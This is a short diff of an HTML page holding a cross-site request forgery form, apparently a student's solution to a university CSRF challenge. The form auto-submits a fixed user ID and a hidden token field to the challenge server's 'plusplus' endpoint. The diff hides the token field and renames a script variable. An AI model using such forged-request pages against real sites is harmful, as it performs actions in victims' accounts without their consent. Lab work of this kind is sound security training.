@@ -9,12 +9,12 @@
   <img src="http://klockren.se/klockren.png" style="width: 500px;" />
   <form name="hackerForm" action="https://snickerboa.it.liu.se/user/csrfchallengetwo/plusplus" method="POST">
     <input type="text" name="userId" value="87d0d107b1521d76bb260cc345c13bf90f6f4cd6" />
-    <input type="text" name="csrfToken" value =csrf />
+    <input type="hidden" name="csrfToken" value =csrfVar />
     <input type="submit"/>
   </form>
 <script> 
 function submitForm(){
-  var csrf = document.querySelector('meta[name="csrfToken"]').content;
+  var csrfVar = document.querySelector('meta[name="csrfToken"]').content;
   document.hackerForm.submit(); 
  }
 </script> 
